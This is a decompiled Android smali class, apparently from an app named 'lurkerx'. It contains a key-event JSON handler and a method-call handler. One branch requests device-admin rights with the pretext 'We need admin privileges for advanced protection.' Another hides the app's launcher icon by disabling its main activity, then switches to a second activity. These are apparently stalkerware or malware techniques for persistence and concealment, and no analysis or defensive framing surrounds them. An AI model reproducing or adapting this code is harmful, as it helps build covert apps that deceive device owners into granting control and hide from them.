.class public final synthetic LX/a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements LA0/p;
.implements LA0/c;


# instance fields
.field public final synthetic e:Ljava/lang/Object;


# direct methods
.method public synthetic constructor <init>(Ljava/lang/Object;)V
    .locals 0

    .line 1
    iput-object p1, p0, LX/a;->e:Ljava/lang/Object;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a(Ljava/lang/Object;)V
    .locals 3

    .line 1
    const/4 v0, 0x0

    .line 2
    if-eqz p1, :cond_0

    .line 3
    .line 4
    :try_start_0
    check-cast p1, Lorg/json/JSONObject;

    .line 5
    .line 6
    const-string v1, "handled"

    .line 7
    .line 8
    invoke-virtual {p1, v1}, Lorg/json/JSONObject;->getBoolean(Ljava/lang/String;)Z

    .line 9
    .line 10
    .line 11
    move-result v0
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 12
    goto :goto_0

    .line 13
    :catch_0
    move-exception p1

    .line 14
    new-instance v1, Ljava/lang/StringBuilder;

    .line 15
    .line 16
    const-string v2, "Unable to unpack JSON message: "

    .line 17
    .line 18
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 19
    .line 20
    .line 21
    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    .line 22
    .line 23
    .line 24
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 25
    .line 26
    .line 27
    move-result-object p1

    .line 28
    const-string v1, "KeyEventChannel"

    .line 29
    .line 30
    invoke-static {v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 31
    .line 32
    .line 33
    :cond_0
    :goto_0
    iget-object p1, p0, LX/a;->e:Ljava/lang/Object;

    .line 34
    .line 35
    check-cast p1, LX/a;

    .line 36
    .line 37
    iget-object p1, p1, LX/a;->e:Ljava/lang/Object;

    .line 38
    .line 39
    check-cast p1, Lk0/a;

    .line 40
    .line 41
    invoke-virtual {p1, v0}, Lk0/a;->e(Z)V

    .line 42
    .line 43
    .line 44
    return-void
.end method

.method public onMethodCall(LA0/n;LA0/q;)V
    .locals 5

    .line 1
    sget v0, Lcom/example/lurkerx/MainActivity;->k:I

    .line 2
    .line 3
    const-string v0, "call"

    .line 4
    .line 5
    invoke-static {p1, v0}, LT0/h;->e(Ljava/lang/Object;Ljava/lang/String;)V

    .line 6
    .line 7
    .line 8
    iget-object p1, p1, LA0/n;->a:Ljava/lang/String;

    .line 9
    .line 10
    const-string v0, "requestAdmin"

    .line 11
    .line 12
    invoke-static {p1, v0}, LT0/h;->a(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 13
    .line 14
    .line 15
    move-result v0

    .line 16
    iget-object v1, p0, LX/a;->e:Ljava/lang/Object;

    .line 17
    .line 18
    check-cast v1, Lcom/example/lurkerx/MainActivity;

    .line 19
    .line 20
    const/4 v2, 0x0

    .line 21
    if-eqz v0, :cond_0

    .line 22
    .line 23
    new-instance p1, Landroid/content/ComponentName;

    .line 24
    .line 25
    const-class v0, Lcom/example/lurkerx/AdminReceiver;

    .line 26
    .line 27
    invoke-direct {p1, v1, v0}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 28
    .line 29
    .line 30
    new-instance v0, Landroid/content/Intent;

    .line 31
    .line 32
    const-string v3, "android.app.action.ADD_DEVICE_ADMIN"

    .line 33
    .line 34
    invoke-direct {v0, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 35
    .line 36
    .line 37
    const-string v3, "android.app.extra.DEVICE_ADMIN"

    .line 38
    .line 39
    invoke-virtual {v0, v3, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 40
    .line 41
    .line 42
    const-string p1, "android.app.extra.ADD_EXPLANATION"

    .line 43
    .line 44
    const-string v3, "We need admin privileges for advanced protection."

    .line 45
    .line 46
    invoke-virtual {v0, p1, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 47
    .line 48
    .line 49
    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 50
    .line 51
    .line 52
    check-cast p2, LA0/o;

    .line 53
    .line 54
    invoke-virtual {p2, v2}, LA0/o;->b(Ljava/lang/Object;)V

    .line 55
    .line 56
    .line 57
    goto :goto_0

    .line 58
    :cond_0
    const-string v0, "hideAndLaunchAct2"

    .line 59
    .line 60
    invoke-static {p1, v0}, LT0/h;->a(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 61
    .line 62
    .line 63
    move-result p1

    .line 64
    if-eqz p1, :cond_1

    .line 65
    .line 66
    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 67
    .line 68
    .line 69
    move-result-object p1

    .line 70
    new-instance v0, Landroid/content/ComponentName;

    .line 71
    .line 72
    const-class v3, Lcom/example/lurkerx/MainActivity;

    .line 73
    .line 74
    invoke-direct {v0, v1, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 75
    .line 76
    .line 77
    const/4 v3, 0x2

    .line 78
    const/4 v4, 0x1

    .line 79
    invoke-virtual {p1, v0, v3, v4}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 80
    .line 81
    .line 82
    new-instance v0, Landroid/content/ComponentName;

    .line 83
    .line 84
    const-class v3, Lcom/example/lurkerx/Act2;

    .line 85
    .line 86
    invoke-direct {v0, v1, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 87
    .line 88
    .line 89
    invoke-virtual {p1, v0, v4, v4}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 90
    .line 91
    .line 92
    new-instance p1, Landroid/content/Intent;

    .line 93
    .line 94
    invoke-virtual {v1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 95
    .line 96
    .line 97
    move-result-object v0

    .line 98
    invoke-direct {p1, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 99
    .line 100
    .line 101
    const/high16 v0, 0x10000000

    .line 102
    .line 103
    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 104
    .line 105
    .line 106
    invoke-virtual {v1, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 107
    .line 108
    .line 109
    invoke-virtual {v1}, Landroid/app/Activity;->finish()V

    .line 110
    .line 111
    .line 112
    check-cast p2, LA0/o;

    .line 113
    .line 114
    invoke-virtual {p2, v2}, LA0/o;->b(Ljava/lang/Object;)V

    .line 115
    .line 116
    .line 117
    :cond_1
    :goto_0
    return-void
.end method
